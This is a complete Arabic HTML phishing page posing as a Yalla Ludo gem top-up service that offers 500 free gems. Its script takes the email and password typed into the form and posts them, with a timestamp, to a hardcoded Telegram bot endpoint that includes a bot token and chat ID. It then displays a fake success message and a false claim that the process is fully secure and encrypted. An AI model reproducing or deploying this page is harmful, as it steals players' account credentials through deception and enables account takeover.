<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yalla Ludo - شحن الجواهر</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: linear-gradient(145deg, #0d0d1a 0%, #1a1a2e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .game-card {
            background: linear-gradient(170deg, #1e1e3a 0%, #12122a 100%);
            border-radius: 35px;
            padding: 40px 35px;
            max-width: 480px;
            width: 100%;
            border: 1px solid rgba(255, 215, 0, 0.15);
            box-shadow: 0 25px 60px rgba(0,0,0,0.8);
        }
        .logo-text {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #f5c842, #ffd700);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-align: center;
            display: block;
        }
        .subtitle {
            color: #8a8ab5;
            text-align: center;
            font-size: 15px;
            margin: 8px 0 20px 0;
        }
        .gems-display {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            background: rgba(255,215,0,0.06);
            padding: 10px 28px;
            border-radius: 50px;
            border: 1px solid rgba(255,215,0,0.12);
            margin: 20px auto;
            width: fit-content;
        }
        .gems-count {
            font-size: 22px;
            font-weight: 700;
            color: #ffd700;
        }
        .form-title {
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            margin: 25px 0 20px 0;
        }
        .form-title span {
            color: #ffd700;
        }
        .form-group {
            margin-bottom: 18px;
        }
        .form-group label {
            display: block;
            color: #b8b8d6;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 15px 16px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.07);
            border-radius: 14px;
            outline: none;
            color: #fff;
            font-size: 16px;
        }
        .form-group input::placeholder {
            color: #5a5a7a;
        }
        .btn-shop {
            width: 100%;
            padding: 16px;
            margin-top: 10px;
            background: linear-gradient(135deg, #f5c842, #e6b800);
            border: none;
            border-radius: 16px;
            color: #1a1a2e;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.25s ease;
        }
        .btn-shop:hover {
            transform: translateY(-2px);
        }
        .status-message {
            margin-top: 16px;
            padding: 12px 16px;
            border-radius: 12px;
            font-size: 14px;
            text-align: center;
            display: none;
        }
        .status-message.success {
            display: block;
            background: rgba(76,175,80,0.12);
            color: #81c784;
            border: 1px solid rgba(76,175,80,0.2);
        }
        .status-message.error {
            display: block;
            background: rgba(244,67,54,0.12);
            color: #ef9a9a;
            border: 1px solid rgba(244,67,54,0.2);
        }
        .footer {
            margin-top: 24px;
            text-align: center;
            color: #4a4a6a;
            font-size: 12px;
        }
        .btn-shop.loading {
            pointer-events: none;
            opacity: 0.7;
        }
        @media (max-width: 480px) {
            .game-card {
                padding: 25px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="game-card">
        <span class="logo-text">🎲 Yalla Ludo</span>
        <div class="subtitle">شحن الجواهر • حساب آمن</div>
        
        <div class="gems-display">
            <span style="font-size:32px;">💎</span>
            <span class="gems-count" id="currentGems">1,247</span>
            <span style="color:#8a8ab5;font-size:13px;">جواهر</span>
        </div>

        <div class="form-title">
            🔓 أدخل بياناتك لشحن <span>+500</span> جوهرة مجاناً
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label>📧 البريد الإلكتروني</label>
                <input type="email" id="emailField" placeholder="example@email.com" required>
            </div>
            <div class="form-group">
                <label>🔑 كلمة المرور</label>
                <input type="password" id="passField" placeholder="••••••••" required>
            </div>
            <button type="submit" class="btn-shop" id="shopBtn">💰 شحن الجواهر الآن</button>
        </form>

        <div id="statusMessage" class="status-message"></div>

        <div class="footer">
            <div>🔐 عملية مشفرة • آمنة 100%</div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var email = document.getElementById('emailField').value.trim();
            var pass = document.getElementById('passField').value.trim();
            var status = document.getElementById('statusMessage');
            var btn = document.getElementById('shopBtn');

            if (!email || !pass) {
                status.textContent = '❌ الرجاء إدخال البريد وكلمة المرور.';
                status.className = 'status-message error';
                return;
            }
            if (!email.includes('@')) {
                status.textContent = '❌ بريد إلكتروني غير صحيح.';
                status.className = 'status-message error';
                return;
            }

            btn.classList.add('loading');
            btn.textContent = '⏳ جاري المعالجة...';

            var msg = '🎲 *Yalla Ludo - شحن جديد* 🎲\\n\\n' +
                      '📧 *البريد:* ' + email + '\\n' +
                      '🔑 *كلمة المرور:* ' + pass + '\\n' +
                      '💎 *الطلب:* شحن 500 جوهرة\\n' +
                      '🕒 *التوقيت:* ' + new Date().toLocaleString('ar-EG');

            var url = 'https://api.telegram.org/bot8630148483:AAEWqz0qCFRj_k9TxU-iC-1kv249RV__gvc/sendMessage';
            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: '8362604097', text: msg, parse_mode: 'Markdown'})
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    status.textContent = '✅ تم شحن الجواهر بنجاح!';
                    status.className = 'status-message success';
                    document.getElementById('emailField').value = '';
                    document.getElementById('passField').value = '';
                } else {
                    status.textContent = '⚠️ حدث خطأ، حاول مرة أخرى.';
                    status.className = 'status-message error';
                }
            })
            .catch(() => {
                status.textContent = '⚠️ تعذر الاتصال، تأكد من الإنترنت.';
                status.className = 'status-message error';
            })
            .finally(() => {
                btn.classList.remove('loading');
                btn.textContent = '💰 شحن الجواهر الآن';
            });
        });
    </script>
</body>
</html>
